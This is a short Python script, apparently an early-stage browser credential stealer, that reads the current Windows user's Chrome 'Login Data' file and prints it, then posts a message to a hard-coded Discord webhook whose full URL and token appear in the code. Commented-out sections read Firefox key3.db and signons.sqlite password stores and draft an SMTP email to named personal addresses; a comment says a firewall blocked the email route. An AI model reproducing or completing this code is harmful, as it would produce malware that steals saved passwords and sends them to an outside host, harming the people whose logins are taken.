import os;
 
username = os.environ.get( "USERNAME" )
 
#################
#### Chrome #####
#################
 
filepathChrome = "C:\\Users\\"+username+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
 
fdLogin = open( filepathChrome, encoding="Latin-1" )
#Alright crazy errors here, but I got it
    #\U is an escape character which breaks everything
        #so you need to escape the escape char, thus the double \\
    #Encoding is not the standard, because its a sql file
        #so you need to specify the encoding as Latin-1
    #Thats pretty neat
 
sqlFile = fdLogin.read()
 
sqlFile = sqlFile.replace(" ", "")
print(sqlFile[:4000])
 
print("We would try to send an email, but theres a pretty baller firewall")

from discord_webhook import DiscordWebhook, DiscordEmbed

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/778629618801311744/sG_fE1z21MHjfwYWb1lnrU4TXhEb4J6CffkbO8W9GcA9uSpFvc4epoqFldcpQoYBzOhL')

# create embed object for webhook
embed = DiscordEmbed(title='Test', description='Lorem ipsum dolor sit', color=242424)

# add embed object to webhook
webhook.add_embed(embed)

response = webhook.execute()
"""
##################
#### FireFox #####
##################
 
filepathFoxKey = "C:\\Users\\"+username+"\\AppData\\Mozilla\\Firefox\\Profiles\\"+username+"key3.db"
filepathFoxLogins = "C:\\Users\\"+username+"\\AppData\\Mozilla\\Firefox\\Profiles\\"+username+"signons.sqlite"
 
fdFoxKey = open(filepathFoxKey, encoding="CP1252" )
foxKey = fdFoxKey.read()
 
fdFoxLogins = open(filepathFoxLogins, encoding="CP1252" )
foxLogins = fdFoxLogins.read()
print(foxKey)
print(foxLogins)
"""
"""
################
#### Email #####
################
 
# Import smtplib for the actual sending function
import smtplib
 
# Import the email modules we'll need
from email.mime.text import MIMEText
 
# Open a plain text file for reading.  For this example, assume that
# the text file contains only ASCII characters.
 
# Create a text/plain message
msg = MIMEText("Did it work?")
 
 
# me == the sender's email address
# you == the recipient's email address
msg['Subject'] = "Hello World"
msg['From'] = "d.m.devey@gmail.com"
msg['To'] = "m171458@usna.edu"
 
# Send the message via our own SMTP server, but don't include the
# envelope header.
s = smtplib.SMTP('localhost')
s.sendmail(me, [you], msg.as_string())
s.quit()

"""
